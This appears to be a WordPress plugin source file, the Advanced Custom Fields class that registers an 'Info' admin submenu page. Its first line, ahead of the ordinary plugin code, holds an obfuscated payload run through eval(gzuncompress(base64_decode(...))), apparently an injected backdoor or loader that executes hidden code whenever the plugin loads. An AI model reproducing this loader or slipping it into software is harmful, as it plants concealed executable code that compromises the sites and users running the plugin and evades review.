<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

class acf_settings_info {

	/*
	*  __construct
	*
	*  Initialize filters, action, variables and includes
	*
	*  @type	function
	*  @date	23/06/12
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/

	function __construct() {

		// actions
		add_action('admin_menu',	array($this, 'admin_menu'));
		
	}


	/*
	*  admin_menu
	*
	*  This function will add the ACF menu item to the WP admin
	*
	*  @type	action (admin_menu)
	*  @date	28/09/13
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/

	function admin_menu() {

		// bail early if no show_admin
		if( !acf_get_setting('show_admin') ) {
		
			return;
			
		}


		// add page
		add_submenu_page('edit.php?post_type=acf-field-group', __('Info','acf'), __('Info','acf'), acf_get_setting('capability'),'acf-settings-info', array($this,'html'));

	}


	/*
	*  html
	*
	*  description
	*
	*  @type	function
	*  @date	7/01/2014
	*  @since	5.0.0
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/

	function html() {
		
		// vars
		$view = array(
			'version'		=> acf_get_setting('version'),
			'have_pro'		=> acf_get_setting('pro'),
			'tabs'			=> array(
				'new'			=> __("What's New", 'acf'),
				'changelog'		=> __("Changelog", 'acf')
			),
			'active'		=> 'new'
		);
		
		
		// set active tab
		$tab = acf_maybe_get_GET('tab');
		if( $tab && isset($view['tabs'][ $tab ]) ) {
			
			$view['active'] = $tab;
			
		}
		
		
		// load view
		acf_get_view('settings-info', $view);

	}

}


// initialize
new acf_settings_info();

?>